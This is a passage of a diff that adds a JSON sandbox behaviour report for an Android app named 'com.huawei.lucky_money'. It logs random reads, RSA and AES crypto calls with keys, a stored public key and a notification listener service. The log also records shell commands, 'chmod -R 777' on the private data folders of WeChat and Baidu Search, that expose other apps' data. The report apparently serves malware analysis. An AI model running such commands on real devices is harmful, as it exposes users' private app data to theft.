+                    "name": "/dev/urandom",
+                    "time": 37.359407,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705945024,
+                    "data": "2efd4b72636c3ee106844e29da4d9785ffcb505b",
+                    "name": "/dev/urandom",
+                    "time": 25.362621,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "34e84d5ee7188d0ae2045ebe5ab4dda03e1d11e0",
+                    "name": "/dev/urandom",
+                    "time": 59.212697,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "cb219171e17a53cd4d58961729e363ac2715d453",
+                    "name": "/dev/urandom",
+                    "time": 13.462328,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705887632,
+                    "data": "29d90b5154c05c6b23891c5a3a3be1f6b091038f",
+                    "name": "/dev/urandom",
+                    "time": 49.236667,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 706255624,
+                    "data": "d9aa03d2467dd3137e35618dc657687f65abdabb",
+                    "name": "/dev/urandom",
+                    "time": 13.512364,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "c51620508d0edb38d0f522746a16918f8dec3e26a5db7fa79e8cc250503b1429045ce1128ade3de3",
+                    "name": "/dev/urandom",
+                    "time": 11.342681,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "705a40948e433b6723b6ed9e9bdbda6ad7ee684b",
+                    "name": "/dev/urandom",
+                    "time": 35.311101,
+                    "processname": "com.huawei.lucky_money"
+                }
+            ],
+            "libraries": [],
+            "phonecalls": [],
+            "cryptousage": [
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "F78BE4D1B6EBB01A",
+                    "time": 11.381597,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "70, 55, 56, 66, 69, 52, 68, 49, 66, 54, 69, 66, 66, 48, 49, 65",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 11.392986,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "70, 55, 56, 66, 69, 52, 68, 49, 66, 54, 69, 66, 66, 48, 49, 65",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 13.38435,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "72CACA7E275AA391",
+                    "time": 13.521444,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "66, 48, 65, 52, 67, 52, 69, 55, 66, 68, 51, 56, 65, 55, 52, 65",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 13.543324,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 706255624,
+                    "data": "B0A4C4E7BD38A74A",
+                    "time": 13.557892,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "66, 48, 65, 52, 67, 52, 69, 55, 66, 68, 51, 56, 65, 55, 52, 65",
+                    "pid": 849,
+                    "tid": 706255624,
+                    "time": 13.636241,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "A318B6F00ED432D0",
+                    "time": 23.39227,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "65, 51, 49, 56, 66, 54, 70, 48, 48, 69, 68, 52, 51, 50, 68, 48",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 23.402204,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "65, 51, 49, 56, 66, 54, 70, 48, 48, 69, 68, 52, 51, 50, 68, 48",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 25.303297,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705945024,
+                    "data": "2BE01F9D5336E3FA",
+                    "time": 25.388272,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "50, 66, 69, 48, 49, 70, 57, 68, 53, 51, 51, 54, 69, 51, 70, 65",
+                    "pid": 849,
+                    "tid": 705945024,
+                    "time": 25.403198,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "EB0CFC5855341669",
+                    "time": 35.356327,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "69, 66, 48, 67, 70, 67, 53, 56, 53, 53, 51, 52, 49, 54, 54, 57",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 35.372321,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "69, 66, 48, 67, 70, 67, 53, 56, 53, 53, 51, 52, 49, 54, 54, 57",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 37.310604,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705909536,
+                    "data": "5725DF1A7940B5B8",
+                    "time": 37.381302,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "53, 55, 50, 53, 68, 70, 49, 65, 55, 57, 52, 48, 66, 53, 66, 56",
+                    "pid": 849,
+                    "tid": 705909536,
+                    "time": 37.440908,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "4B6D9B50AD9DA670",
+                    "time": 47.332173,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "52, 66, 54, 68, 57, 66, 53, 48, 65, 68, 57, 68, 65, 54, 55, 48",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 47.338584,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "52, 66, 54, 68, 57, 66, 53, 48, 65, 68, 57, 68, 65, 54, 55, 48",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 49.193302,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705887632,
+                    "data": "7F6FF2EBDBE84FB2",
+                    "time": 49.259999,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "55, 70, 54, 70, 70, 50, 69, 66, 68, 66, 69, 56, 52, 70, 66, 50",
+                    "pid": 849,
+                    "tid": 705887632,
+                    "time": 49.27435,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "05EE8974FF5BD511",
+                    "time": 59.222966,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "key": "48, 53, 69, 69, 56, 57, 55, 52, 70, 70, 53, 66, 68, 53, 49, 49",
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "time": 59.232614,
+                    "algorithm": "AES",
+                    "processname": "com.huawei.lucky_money"
+                }
+            ],
+            "fileswritten": [
+                {
+                    "pid": 849,
+                    "tid": 705897888,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<string name=\"key\">30820122300d06092a864886f70d01010105000382010f003082010a0282010100a483463a42604a751a22b6e3db7eb2cc3ae4b5f7f695dba4c4c70ee5da64a2117821d245a2633f6b17f7b037752606b1e37741ba14ae3138e948c40b76d8a186a02c34adb97131953d47b4d08515c7c4b0e83b7fcd498c813220d35fe966e83c8d2e6e851d85f2b81a7b4b30b6511660924d385c6a49541c7dda9c7fdab9ff29cd5eb961004e817426134c58958506c692cfd5f30e4c2b8f0564171bfcf863b3443ca0321297a6792c38a5c4ed67a23f331a3bc5f39ffc3288c035dbe12b505944365c176e536f652c677335d527e6670c27b0ef69519f19c28fe36cd299bc1e1488d21280b326200cdc5cfea4a939c2f7862814754d8e33c5f045267419174d0203010001</string>\n</map>\n",
+                    "name": "/data/data/com.huawei.lucky_money/shared_prefs/PublicKey.xml",
+                    "time": 6.262546,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<boolean name=\"isFirst\" value=\"true\" />\n</map>\n",
+                    "name": "/data/data/com.huawei.lucky_money/shared_prefs/isFirst.xml",
+                    "time": 0.542384,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 706255624,
+                    "data": "exit\n",
+                    "name": "pipe:[2919]",
+                    "time": 13.472638,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705529400,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"wifi_sleep_policy\" value=\"0\" />\n</map>\n",
+                    "name": "/data/data/com.huawei.lucky_money/shared_prefs/wifi_sleep_policy.xml",
+                    "time": 0.741002,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705671008,
+                    "data": "chmod -R 777 /data/data/com.baidu.searchbox\nexit\n",
+                    "name": "pipe:[2787]",
+                    "time": 3.342287,
+                    "processname": "com.huawei.lucky_money"
+                },
+                {
+                    "pid": 849,
+                    "tid": 705671008,
+                    "data": "chmod -R 777 /data/data/com.tencent.mm/\nexit\n",
+                    "name": "pipe:[2775]",
+                    "time": 2.753644,
+                    "processname": "com.huawei.lucky_money"
+                }
+            ],
+            "servicestart": [
+                {
+                    "pid": 849,
+                    "tid": 1073870640,
+                    "name": "com.huawei.lucky_money.BaseNotificationListener",
+                    "time": 0.701438,
+                    "processname": "com.huawei.lucky_money"
+                }
+            ]
+        }
+    }
+}
